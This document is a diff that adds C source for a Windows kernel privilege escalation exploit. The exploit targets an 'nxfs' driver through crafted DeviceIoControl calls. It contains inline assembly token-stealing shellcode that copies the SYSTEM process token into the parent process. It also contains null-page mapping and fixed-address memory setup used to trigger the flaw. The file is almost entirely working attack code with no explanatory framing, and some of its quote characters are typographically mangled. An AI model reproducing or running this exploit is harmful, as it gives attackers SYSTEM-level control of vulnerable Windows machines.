@@ -1,0 +1,345 @@
+#include “stdafx.h”
+
+#include <Windows.h>
+
+ 
+
+#define DEVICE L”\\\\.\\nxfs-709fd562-36b5-48c6-9952-302da6218061″
+
+#define DEVICE2 L”\\\\.\\nxfs-net-709fd562-36b5-48c6-9952-302da6218061{709fd562-36b5-48c6-9952-302da6218061}”
+
+#define IOCTL 0x00222014
+
+#define IOCTL2 0x00222030
+
+#define OUT_SIZE 0x90
+
+#define IN_SIZE 0x10
+
+ 
+
+#define KTHREAD_OFFSET 0x124
+
+#define EPROCESS_OFFSET 0x050
+
+#define PID_OFFSET 0x0b4
+
+#define FLINK_OFFSET 0x0b8
+
+#define TOKEN_OFFSET 0x0f8
+
+#define SYSTEM_PID 0x004
+
+#define PARENT_PID 0x140
+
+ 
+
+__declspec(naked)VOID TokenStealingShellcode()
+
+{
+
+            __asm{
+
+            xor eax, eax;
+
+            mov eax, fs:[eax + KTHREAD_OFFSET];
+
+            mov eax, [eax + EPROCESS_OFFSET];
+
+            mov esi, [eax + PARENT_PID]; Get parent pid
+
+ 
+
+            Loop1:
+
+                        mov eax, [eax + FLINK_OFFSET];
+
+                        sub eax, FLINK_OFFSET;
+
+                        cmp esi, [eax + PID_OFFSET];
+
+                        jne Loop1;
+
+           
+
+            mov ecx, eax;
+
+            mov ebx, [eax + TOKEN_OFFSET];
+
+            mov edx, SYSTEM_PID;
+
+ 
+
+            Search:
+
+                        mov eax, [eax + FLINK_OFFSET];
+
+                        sub eax, FLINK_OFFSET;
+
+                        cmp[eax + PID_OFFSET], edx;
+
+                        jne Search;
+
+           
+
+            mov edx, [eax + TOKEN_OFFSET];
+
+            mov[ecx + TOKEN_OFFSET], edx;
+
+            add esp, 0x58;
+
+            add[esp], 5;
+
+            ret 4;
+
+            }
+
+}
+
+ 
+
+typedef NTSTATUS(WINAPI *PNtAllocateVirtualMemory)(
+
+            HANDLE ProcessHandle,
+
+            PVOID *BaseAddress,
+
+            ULONG ZeroBits,
+
+            PULONG AllocationSize,
+
+            ULONG AllocationType,
+
+            ULONG Protect
+
+            );
+
+ 
+
+typedef NTSTATUS(WINAPI *PNtFreeVirtualMemory)(
+
+            HANDLE ProcessHandle,
+
+            PVOID *BaseAddress,
+
+            PULONG RegionSize,
+
+            ULONG FreeType
+
+            );
+
+ 
+
+int main()
+
+{
+
+            HMODULE module = LoadLibraryA(“ntdll.dll”);
+
+            PNtAllocateVirtualMemory AllocMemory = (PNtAllocateVirtualMemory)GetProcAddress(module, “NtAllocateVirtualMemory”);
+
+            PNtFreeVirtualMemory FreeMemory = (PNtFreeVirtualMemory)GetProcAddress(module, “NtFreeVirtualMemory”);
+
+ 
+
+            SIZE_T size = 0x1000;
+
+            PVOID address1 = (PVOID)0x05ffff00;
+
+           
+
+ 
+
+            NTSTATUS allocStatus = AllocMemory(GetCurrentProcess(),
+
+                        &address1,
+
+                        0,
+
+                        &size,
+
+                        MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
+
+                        PAGE_EXECUTE_READWRITE);
+
+           
+
+            if (allocStatus != 0)
+
+            {
+
+                        printf(“[x]Couldnt alloc page\n”);
+
+                        exit(-1);
+
+            }
+
+            printf(“[+] Allocated address at %p\n”, address1);
+
+            *(ULONG *)0x05fffff4 = 5;
+
+            *(ULONG *)0x060000ac = 0x20;
+
+            *(ULONG *)0x060001dc = 0x05ffff00;
+
+            *(ULONG *)(0x05ffff00 – 0x18) = 1;
+
+            *(ULONG *)(0x05ffff00 – 0x14) = 0;
+
+           
+
+            PVOID address2 = (PVOID)0x1;
+
+            SIZE_T size2 = 0x1000;
+
+           
+
+            allocStatus = AllocMemory(GetCurrentProcess(),
+
+                        &address2,
+
+                        0,
+
+                        &size2,
+
+                        MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
+
+                        PAGE_EXECUTE_READWRITE);
+
+ 
+
+            if (allocStatus != 0)
+
+            {
+
+                        printf(“[x]Couldnt alloc page2\n”);
+
+                        exit(-1);
+
+            }
+
+            *(ULONG *)0x64 = (ULONG)&TokenStealingShellcode;
+
+            printf(“[+] Mapped null page\n”);
+
+ 
+
+            char inBuff[IN_SIZE];
+
+            char outBuff[OUT_SIZE];
+
+ 
+
+            HANDLE handle = 0;
+
+                       
+
+            DWORD returned = 0;
+
+            memset(inBuff, 0x41, IN_SIZE);
+
+            memset(outBuff, 0x43, OUT_SIZE);
+
+ 
+
+            *(ULONG *)inBuff = 0x00000190;
+
+            *(ULONG *)(inBuff + 4) = 0x00000001;
+
+           
+
+            printf(“[+] Creating nxfs-net… device through IOCTL 222014\n”);
+
+            handle = CreateFile(DEVICE,
+
+                                    GENERIC_READ | GENERIC_WRITE,
+
+                                    FILE_SHARE_READ | FILE_SHARE_WRITE,
+
+                                    NULL,
+
+                                    OPEN_EXISTING,
+
+                                    FILE_ATTRIBUTE_NORMAL,
+
+                                    0);
+
+ 
+
+            if (handle == INVALID_HANDLE_VALUE)
+
+            {
+
+                        printf(“[x] Couldn’t open device\n”);
+
+                        exit(-1);
+
+            }
+
+ 
+
+            int ret = DeviceIoControl(handle,
+
+                                    IOCTL,
+
+                                    inBuff,
+
+                                    IN_SIZE,
+
+                                    outBuff,
+
+                                    OUT_SIZE,
+
+                                    &returned,
+
+                                    0);
+
+ 
+
+            HANDLE handle2 = CreateFile(DEVICE2,
+
+                        GENERIC_READ | GENERIC_WRITE,
+
+                        FILE_SHARE_READ | FILE_SHARE_WRITE,
+
+                        NULL,
+
+                        OPEN_EXISTING,
+
+                        FILE_ATTRIBUTE_NORMAL,
+
+                        0);
+
+ 
+
+            char inBuff2[0x30];
+
+            char outBuff2[0x30];
+
+ 
+
+            printf(“[+] Triggering exploit…”);
+
+ 
+
+            ret = DeviceIoControl(handle2,
+
+                        IOCTL2,
+
+                        inBuff2,
+
+                        0x30,
+
+                        outBuff2,
+
+                        0x30,
+
+                        &returned,
+
+                        0);
+
+           
+
+            return 0;
+
+}
